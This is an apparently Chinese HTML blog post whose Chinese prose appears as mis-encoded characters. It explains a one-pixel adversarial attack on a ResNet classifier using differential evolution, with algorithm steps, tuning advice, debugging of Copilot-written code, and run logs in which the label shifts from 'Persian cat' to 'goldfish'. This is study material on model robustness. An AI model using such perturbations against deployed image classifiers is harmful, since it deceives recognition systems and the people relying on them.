title="å…·ä½“æµç¨‹"></a>å…·ä½“æµç¨‹</h3><p>åœ¨æ­¤ç®€è¿°DEçš„æµç¨‹ï¼Œä»¥å…é—å¿˜</p><blockquote><p>ç°æœ‰ä¸€åä¸º<code>func</code>çš„é»‘ç›’/ç™½ç›’å‡½æ•°ï¼Œå…¶æ¥å—å‘é‡Xä½œä¸ºå‚æ•°</p><p>ç°ä½¿ç”¨<code>DE()</code>æ±‚ä½¿å¾—<code>func()</code>å°½å¯èƒ½å°çš„å‘é‡</p></blockquote><ul><li>éšæœºåˆå§‹åŒ–<code>popSize</code>ä¸ªå‘é‡ä½œä¸ºæ—ç¾¤<code>pop</code>ï¼Œè¿™äº›å‘é‡ç¬¦åˆ<code>func</code>å¯¹è¾“å…¥å‘é‡çš„è¦æ±‚</li><li>å½“æ—ç¾¤<code>pop</code>ä¸­ä¸å­˜åœ¨ä»»ä½•ä¸€ä¸ªå‘é‡<code>x</code>æ»¡è¶³<code>func(x)&lt;cutoff</code>ï¼š<ul><li>ä½¿æ—ç¾¤<code>pop</code>ä¸­çš„æ¯ä¸€ä¸ªå‘é‡<code>x</code>ä½œä¸ºæ‚äº¤çˆ¶å‘é‡ä¹‹ä¸€ï¼š<ul><li>éšæœºé€‰å–3ä¸ª<code>pop</code>ä¸­çš„å‘é‡<code>a,b,c</code>ï¼Œä¸”ä»–ä»¬ä¸<code>x</code>ä¸ç›¸ç­‰</li><li>ä»¤å¦ä¸€æ‚äº¤çˆ¶å‘é‡<code>mutant=a+mut*(b-c)</code></li><li>éšæœºç”Ÿæˆé•¿åº¦ä¸<code>x</code>ç›¸åŒçš„ä»…åŒ…å«<code>True,False</code>çš„å‘é‡ï¼Œæ¯ä¸ªå…ƒç´ ä¸º<code>True</code>çš„å¯èƒ½æ€§ä¸º<code>CR</code>ï¼Œç§°æ­¤01å‘é‡ä¸º<code>crossOver</code></li><li>ä½¿<code>mutant</code>ä¸<code>x</code>è¿›è¡Œæ‚äº¤ï¼Œç”Ÿæˆçš„æ‚äº¤å­å‘é‡ä¸º<code>child=x*(1-crossOver)+mutant*crossOver</code></li><li>å¦‚æœ<code>child</code>ä¸­çš„å…ƒç´ è¶Šç•Œï¼Œæœ‰å‡ ç§å¤„ç†åŠæ³•ï¼š<ul><li>Clipï¼ˆè¾ƒä¸ºä¿å®ˆçš„åŠæ³•ï¼Œä¼šä¸€å®šç¨‹åº¦é™ä½å¤šæ ·æ€§ï¼‰</li><li>å–ä½™ï¼ˆè¾ƒä¸ºä¸­åº¸çš„åŠæ³•ï¼‰</li><li>å–éšæœºæ•°ï¼ˆè¾ƒä¸ºæ¿€è¿›çš„åŠæ³•ï¼Œå¢åŠ å¤šæ ·æ€§ä½†å¯èƒ½å¯¼è‡´æ··ä¹±ç¨‹åº¦å¢åŠ ï¼Œæ›´éš¾æ”¶æ•›ï¼‰</li></ul></li><li>å½“<code>func(child)&lt;func(x)</code><ul><li>æ›´æ–°æ—ç¾¤<code>x=child</code></li></ul></li></ul></li></ul></li><li>è¿”å›æ»¡è¶³<code>func(x)&lt;cutoff</code>çš„å‘é‡<code>x</code></li></ul><h2 id="è°ƒå‚"><a href="#è°ƒå‚" class="headerlink" title="è°ƒå‚"></a>è°ƒå‚</h2><p>å¯ä»¥å…ˆå‚è€ƒè¿™ç¯‡<a href="https://www.docin.com/p-2278988320.html">æŒ‚è±†ä¸çš„ä¸­æ–‡è®ºæ–‡</a>ï¼Œé‡Œé¢ä»‹ç»äº†å„ä¸ªå‚æ•°çš„æ•ˆæœä»¥åŠå¦‚ä½•æ”¹è¿›ï¼Œä½†æˆ‘è§‰å¾—implementèµ·æ¥æ€§ä»·æ¯”æœ€é«˜çš„å°±æ˜¯åŠ¨æ€è°ƒæ•´çš„<code>F</code>å’Œéšæœºç”Ÿæˆçš„<code>CR</code></p><p>åœ¨æ­¤æ€»ç»“ä¸€ä¸‹ï¼š</p><ul><li><code>F</code>âˆˆ[0,2]ï¼Œæœ€å¥½è®¾ç½®æˆåŠ¨æ€çš„</li><li><code>CR</code>âˆˆ(0,1)</li><li><code>popSize</code>ï¼šé€šå¸¸åœ¨50ä»¥å†…ï¼Œä½†ç†è®ºä¸Šè¶Šå¤§åˆ™è¶Šæœ‰å¯èƒ½æ‰¾åˆ°å…¨å±€æœ€ä¼˜è§£ï¼Œä½†å¤ªå¤§äº†ä¼šå¯¼è‡´æ”¶ç›Šä¸è¶³ä»¥å¼¥è¡¥è®¡ç®—é€Ÿåº¦è¿‡æ…¢å¸¦æ¥çš„æŸå¤±</li><li><code>maxIter</code>ï¼šå¦‚æœé‡‡ç”¨åŠ¨æ€<code>F</code>ï¼Œåˆ™éœ€è¦æ–Ÿé…Œä¸€ä¸‹ï¼Œä¾‹å¦‚æˆ‘çš„<code>F</code>å°±ä¸<code>maxIter</code>æœ‰å…³<code>F=alpha*(np.exp(maxIter/(maxIter+iterCnt))-1)</code></li></ul><h2 id="Copilotå¸¦æ¥çš„é—®é¢˜"><a href="#Copilotå¸¦æ¥çš„é—®é¢˜" class="headerlink" title="Copilotå¸¦æ¥çš„é—®é¢˜"></a>Copilotå¸¦æ¥çš„é—®é¢˜</h2><p>åœ¨æœ€å¼€å§‹ç”¨é­”æ”¹ç‰ˆCopilotç”Ÿæˆçš„DEè§£å†³è¿™ä¸ªé¢˜ç›®æ—¶ï¼Œç»å¸¸é‡åˆ°çš„ä¸€ä¸ªé—®é¢˜ï¼šåœ¨æŸä¸€æ—¶åˆ»ï¼ˆé€šå¸¸æ˜¯æ¼”åŒ–çš„åˆæœŸï¼‰ï¼Œçªç„¶æ•´ä¸ªæ—ç¾¤éƒ½è¿›è¡Œäº†ä¸€æ¬¡æ¼”åŒ–ï¼Œå³åœ¨ä¸€æ¬¡è¿›åŒ–ä¸­ï¼Œæ•´ä¸ªæ—ç¾¤éƒ½æ›´æ–°äº†ï¼Œä½†åœ¨è¿™ä¹‹åï¼Œå°±ä¸å†æœ‰ä»»ä½•ä¸€ä¸ªå‘é‡åœ¨æ¼”åŒ–ä¸­æ”¹å˜</p><blockquote><p>åè®°ï¼šå¯¹äºä¸Šè¿°ç°è±¡ï¼Œå…¶å®å°±æ˜¯Copilotå†™çš„æ¯”è¾ƒæ‹‰ï¼Œåœ¨å¤šæ¬¡é­”æ”¹åæ­¤bugå‡­ç©ºæ¶ˆå¤±ã€‚æ„Ÿè§‰æ˜¯å› ä¸ºCopilotå†™çš„ä»£ç ä¸­ï¼Œå¯¹äºå¾…ä¼˜åŒ–çš„å‡½æ•°å®šä¹‰æ¨¡ç³Šï¼Œå˜é‡å…³ç³»æ··ä¹±ï¼Œå‚è€ƒçš„å˜é‡è¿‡äºå•ä¸€ã€‚è¯¦ç»†åœ°è¯´ï¼Œå°±æ˜¯ResNetä¸­çš„ç±»åˆ«æ•°é‡é«˜è¾¾1000ä¸ªï¼Œå…¶Labelä¸­å¸¦æœ‰â€catâ€çš„å°±æœ‰åæ¥ä¸ªï¼ˆä¸åŒå“ç§çš„çŒ«ï¼‰ï¼Œä¹Ÿè®¸åœ¨æŸä¸€æ—¶åˆ»ï¼Œä¸€ä¸ªå™ªéŸ³æˆåŠŸæ›´æ”¹äº†Labelï¼Œä½†åªæ˜¯æŠŠLabelä»æœ€åˆçš„Persian Catæ”¹æˆäº†å¦ä¸€ç§Catï¼Œè¿™ä¸ªæˆåŠŸçš„å™ªéŸ³é¡ºåˆ©æˆä¸ºäº†æœ€ä½³å™ªéŸ³ï¼›å› ä¸ºéœ€è¦è®¡ç®—æœ€ä½³å™ªéŸ³çš„fitnesså’Œé¢„æµ‹ç»“æœï¼Œå¯¼è‡´åŸæœ¬æ˜¯Persian Catçš„classIDè¢«æ”¹æˆå¦ä¸€ç§çŒ«çš„classIDï¼›è¿™ä¸€æ›´æ”¹ä½¿å¾—æ—ç¾¤çš„fitnesså€¼æ•´ä½“å¤§å¹…ä¸‹é™ï¼Œæ•´ä¸ªæ—ç¾¤æˆ–è€…ç»å¤§å¤šæ•°å‘é‡éƒ½æ¥å—äº†æ–°çš„childï¼Œå¯¼è‡´æˆ‘ä»¬çœ‹åˆ°çš„çªç„¶å¤§è§„æ¨¡æ›´æ–°çš„ç°è±¡ï¼Œè€Œå› ä¸ºå¦ä¸€ç§çŒ«çš„æ¦‚ç‡æœ¬èº«å°±ä¸é«˜ï¼Œæ¢¯åº¦è¿‡äºå¹³ç¼“ç”šè‡³æ¶ˆå¤±ï¼ŒDEåœ¨ä¸€ç‰‡å¤§å¹³åœ°ä¸Šéš¾ä»¥å‘æŒ¥ä½œç”¨ï¼Œå¯¼è‡´æˆ‘ä»¬çœ‹åˆ°çš„åœ¨å¤§è§„æ¨¡æ›´æ–°åå†æ— æ›´æ–°çš„ç°è±¡</p><p>ï¼ˆæ‰¾è¿™ä¸ªbugçœŸçš„ç»™æˆ‘æ‰¾éº»äº†ï¼Œè™½ç„¶ä¸æ˜¯æœ‰æ„ä¿®å¤äº†bugï¼Œä½†æˆ‘è§‰å¾—bugæˆå› åº”è¯¥æ˜¯è¿™æ ·çš„</p></blockquote><p>è™½ç„¶è¿™ä¸ªbugæ˜¯Copiloté€ æˆçš„ï¼Œä½†æˆ‘ä¹‹å‰ä¹Ÿgoogleäº†ç›¸å…³é—®é¢˜ï¼Œæ‰¾åˆ°äº†<a href="https://www.researchgate.net/publication/2645446_On_Stagnation_Of_The_Differential_Evolution_Algorithm">On_Stagnation_Of_The_Differential_Evolution_Algorithm</a>ï¼Œè§£é‡Šäº†ä¸€ä¸‹ä¸ºä»€ä¹ˆDEç®—æ³•ä¸­å­˜åœ¨æ—ç¾¤åœæ­¢æ¼”åŒ–çš„ç°è±¡</p><p><img src="/images/OnePixelAttackWithDE_Stagnant.png.png"></p><p>æ„Ÿè§‰ä»–è¯´äº†æŒºå¤šçš„ï¼Œåˆæ„Ÿè§‰ä»–ä»€ä¹ˆä¹Ÿæ²¡è¯´ï¼Œæ€»ä¹‹åœ¨æ²¡æœ‰æˆ‘è¿™ä¸ªbugçš„æƒ…å†µä¸‹ï¼Œå°±æ˜¯æ‰©å¤§ç§ç¾¤è§„æ¨¡ï¼Œæä¾›æ›´å¹¿æ³›çš„å¤šæ ·æ€§ï¼Œå°±èƒ½ä½¿å¾—åœæ»çš„æ¦‚ç‡å‡å°ï¼Œè€Œåœæ»çš„æˆå› åˆ™æ˜¯é™·å…¥å±€éƒ¨æœ€ä¼˜è§£ï¼ˆä¹</p><p>æˆ‘è¿˜å»é—®äº†ChatGPTï¼Œéƒ½æ˜¯AIåº”è¯¥æ¯”è¾ƒäº’ç›¸äº†è§£ï¼ˆä¹ï¼š</p><p><img src="/images/OnePixelAttackWithDE_GPT1.png"></p><p><img src="/images/OnePixelAttackWithDE_GPT2.png"></p><p>è™½ç„¶ç‚¹äº†å¾ˆå¤šæ¬¡Try Againä¹Ÿæ²¡æ‰¾å‡ºæ—ç¾¤çªç„¶å…¨ä½“çªå˜çš„bugï¼Œä½†å€’æ˜¯ç»™æˆ‘æŠŠå¦ä¸€ä¸ªCopilotå†™çš„bugç»™æˆ‘æ‰¾å‡ºæ¥äº†ï¼Œå°±æ˜¯target vectorå±…ç„¶æ˜¯éšæœºå–çš„è€Œä¸æ˜¯æŒ¨ä¸ªå„¿æ¥ï¼Œæ¯•ç«Ÿè¿™ä¸€å †ä¸œè¥¿é‡Œé¢<code>random</code>ç”¨çš„æŒºå¤šçš„ï¼Œæˆ‘è¿˜çœŸæ²¡çœ‹å‡ºæ¥ï¼Œäºæ˜¯ç«‹åˆ»æ”¹æ‰ç„¶ååšæˆæ ‡å‡†çš„DEäº†</p><h2 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h2><p>è¯´å®è¯ï¼Œç‰¹åˆ«æ˜¯è¿™ç§çœ‹è¿æ°”çš„ç¨‹åºï¼Œç›¯ç€è¾“å‡ºç»ˆç«¯çœ‹æ„Ÿè§‰å°±åƒåœ¨äº§æˆ¿é—¨å£ç­‰è€å©†ä¸€æ ·ç´§å¼ ï¼Œæ‰€ä»¥è®°å½•å‡ æ®µè¾“å‡ºï¼Œè§è¯ä¸€ä¸‹</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        alpha=0.4ï¼ŒpopSize=20ï¼ŒmaxIter=100    </div>    <div class='spoiler-content'>        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">(&#39;Persian cat&#39;, 0.265370637178421)</span><br><span class="line"></span><br><span class="line"> ### Starting DE Attack 1 ###</span><br><span class="line"></span><br><span class="line">Initializing Differential Evolution</span><br><span class="line">Initializing fitness:  20</span><br><span class="line"></span><br><span class="line"> # iter:  1 best fitness:  0.2845600592554547 best solution:  [ 29   4 202 195  42]</span><br><span class="line">    - F:  0.6766003777597516</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  11</span><br><span class="line">    ğŸ”µ new best fitness:  0.26558117862441577  new best solution:  [ 10  37   4 244  71]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.16487646102905273)</span><br><span class="line">    - mean fitness:  0.31238916044676446</span><br><span class="line"> # iter:  2 best fitness:  0.26558117862441577 best solution:  [ 10  37   4 244  71]</span><br><span class="line">    - F:  0.6662005326545324</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  6</span><br><span class="line">    - mean fitness:  0.3056630621358636</span><br><span class="line"> # iter:  3 best fitness:  0.26558117862441577 best solution:  [ 10  37   4 244  71]</span><br><span class="line">    - F:  0.656100186679759</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  6</span><br><span class="line">    ğŸ”µ new best fitness:  0.24916027527069673  new best solution:  [ 24  31 134 197  94]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.16068297624588013)</span><br><span class="line">    - mean fitness:  0.2983871838674531</span><br><span class="line"> # iter:  4 best fitness:  0.24916027527069673 best solution:  [ 24  31 134 197  94]</span><br><span class="line">    - F:  0.6462870241393159</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  4</span><br><span class="line">    - mean fitness:  0.2935906742452062</span><br><span class="line"> # iter:  5 best fitness:  0.24916027527069673 best solution:  [ 24  31 134 197  94]</span><br><span class="line">    - F:  0.6367493783259498</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  4</span><br><span class="line">    - mean fitness:  0.28915020487766013</span><br><span class="line"> # iter:  6 best fitness:  0.24916027527069673 best solution:  [ 24  31 134 197  94]</span><br><span class="line">    - F:  0.6274761901752574</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  5</span><br><span class="line">    - mean fitness:  0.2849028466225718</span><br><span class="line"> # iter:  7 best fitness:  0.24916027527069673 best solution:  [ 24  31 134 197  94]</span><br><span class="line">    - F:  0.6184569699902873</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  2</span><br><span class="line">    - mean fitness:  0.27997543959209</span><br><span class="line"> # iter:  8 best fitness:  0.24916027527069673 best solution:  [ 24  31 134 197  94]</span><br><span class="line">    - F:  0.6096817619774788</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  6</span><br><span class="line">    ğŸ”µ new best fitness:  0.2081426924560219  new best solution:  [ 26  28 207 212 232]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.13251474499702454)</span><br><span class="line">    - mean fitness:  0.27476091143325904</span><br><span class="line"> # iter:  9 best fitness:  0.2081426924560219 best solution:  [ 26  28 207 212 232]</span><br><span class="line">    - F:  0.6011411113590921</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  5</span><br><span class="line">    - mean fitness:  0.27236858464457325</span><br><span class="line"> # iter:  10 best fitness:  0.2081426924560219 best solution:  [ 26  28 207 212 232]</span><br><span class="line">    - F:  0.5928260338492048</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  5</span><br><span class="line">    ğŸ”µ new best fitness:  0.19687939991126768  new best solution:  [ 26  28 246 212 232]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.12056729197502136)</span><br><span class="line">    - mean fitness:  0.2706069266641862</span><br><span class="line"> # iter:  11 best fitness:  0.19687939991126768 best solution:  [ 26  28 246 212 232]</span><br><span class="line">    - F:  0.5847279872999954</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  2</span><br><span class="line">    ğŸ”µ new best fitness:  0.167548724275548  new best solution:  [  9  32  14 119 170]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Siamese cat&#39;, 0.06791895627975464)</span><br><span class="line">    - mean fitness:  0.2661146746744635</span><br><span class="line"> # iter:  12 best fitness:  0.167548724275548 best solution:  [  9  32  14 119 170]</span><br><span class="line">    - F:  0.5768388453426972</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  4</span><br><span class="line">    - mean fitness:  0.2630609781524981</span><br><span class="line"> # iter:  13 best fitness:  0.167548724275548 best solution:  [  9  32  14 119 170]</span><br><span class="line">    - F:  0.5691508728634869</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  5</span><br><span class="line">    - mean fitness:  0.2571228217886528</span><br><span class="line"> # iter:  14 best fitness:  0.167548724275548 best solution:  [  9  32  14 119 170]</span><br><span class="line">    - F:  0.561656703168862</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  4</span><br><span class="line">    - mean fitness:  0.25257750129821943</span><br><span class="line"> # iter:  15 best fitness:  0.167548724275548 best solution:  [  9  32  14 119 170]</span><br><span class="line">    - F:  0.5543493167079622</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  2</span><br><span class="line">    - mean fitness:  0.25171417870151347</span><br><span class="line"> # iter:  16 best fitness:  0.167548724275548 best solution:  [  9  32  14 119 170]</span><br><span class="line">    - F:  0.5472220212308999</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  3</span><br><span class="line">    - mean fitness:  0.25043370262428655</span><br><span class="line"> # iter:  17 best fitness:  0.167548724275548 best solution:  [  9  32  14 119 170]</span><br><span class="line">    - F:  0.5402684332726887</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  1</span><br><span class="line">    - mean fitness:  0.24717705660732464</span><br><span class="line"> # iter:  18 best fitness:  0.167548724275548 best solution:  [  9  32  14 119 170]</span><br><span class="line">    - F:  0.533482460861836</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  0</span><br><span class="line">    - mean fitness:  0.24717705660732464</span><br><span class="line"> # iter:  19 best fitness:  0.167548724275548 best solution:  [  9  32  14 119 170]</span><br><span class="line">    - F:  0.5268582873612809</span><br><span class="line">    - vec:  20</span><br><span class="line">    - changed vec num:  2</span><br><span class="line">    ğŸ”µ new best fitness:  0.12234273354988545  new best solution:  [  9  32  14  50 170]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;goldfish&#39;, 0.06539428979158401)</span><br><span class="line">    - mean fitness:  0.24463605969795027</span><br><span class="line"></span><br><span class="line">ğŸŸ¢ Holy shit, solution found! Now it&#39;s a  goldfish with probability 0.06539428979158401</span><br></pre></td></tr></table></figure>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        alpha=0.4ï¼ŒpopSize=50ï¼ŒmaxIter=100    </div>    <div class='spoiler-content'>        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span 